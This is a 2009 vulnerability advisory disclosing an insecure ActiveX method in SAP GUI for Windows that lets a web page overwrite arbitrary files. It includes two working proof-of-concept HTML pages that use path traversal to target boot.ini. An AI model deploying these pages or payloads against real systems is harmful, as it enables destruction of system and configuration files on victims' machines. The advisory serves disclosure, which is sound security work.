@@ -1,0 +1,93 @@
+Digital Security Research Group [DSecRG] Advisory       #DSECRG-09-044
+
+
+Application:                    EnjoySAP, SAP GUI for Windows 6.4 and 7.1       
+Versions Affected:              Tested on 7100.2.7.1038 PL 7
+Vendor URL:                     http://SAP.com
+Bugs:                           insecure method, File owervriting
+Exploits:                       YES
+Reported:                       02.07.2009
+Vendor response:                02.07.2009
+Date of Public Advisory:        22 сент
+CVE-number:                     
+Author:                         Digital Security Research Group [DSecRG] (research [at] dsec [dot] ru)
+
+
+
+Description
+***********
+
+SAP GUI for Windows 7.1 and 6.4 contains ActiveX component EAI WebViewer3D ( file WebViewer3D.dll) Lib GUID:    {AFBBE070-7340-11d2-AA6B-00E02924C34E}
+
+which is contains insecure method that can overwrite any file in system. 
+
+Details
+*******
+
+Attacker can construct html page which call one of the wulnerable functions such as: 
+
+1) SaveToSessionFile
+2) SaveViewToSessionFile
+
+from ActiveX component EAI WebViewer3D
+
+
+
+Example1:
+
+<HTML>
+<BODY>
+ <object id=ctrl classid="clsid:{AFBBE070-7340-11d2-AA6B-00E02924C34E}"></object>
+<SCRIPT>
+function Do_1t()
+ {
+   File = "../../../../../../../../../../../../boot.ini"
+   ctrl.SaveToSessionFile(File)
+ }
+</SCRIPT>
+<input language=JavaScript onclick=Do_1t() type=button value="P0c">
+</BODY>
+</HTML>
+
+
+Example2:
+
+<HTML>
+<BODY>
+ <object id=ctrl classid="clsid:{AFBBE070-7340-11d2-AA6B-00E02924C34E}"></object>
+<SCRIPT>
+function Do_1t()
+ {
+   File = "../../../../../../../../../../../../boot.ini"
+   ctrl.SaveViewToSessionFile(File)
+ }
+</SCRIPT>
+<input language=JavaScript onclick=Do_1t() type=button value="P0c">
+</BODY>
+</HTML>
+
+
+
+
+For example we can overwrite boot.ini file or  sapgui.ini which contains all connectionbs to sap servers 
+
+
+Fix Information
+***************
+
+
+
+About
+*****
+
+Digital Security is one of the leading IT security companies in CEMEA, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards. Digital Security Research Group focuses on application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.
+
+
+Contact:        research [at] dsecrg [dot] com
+                http://www.dsecrg.com
+
+
+
+
+
+
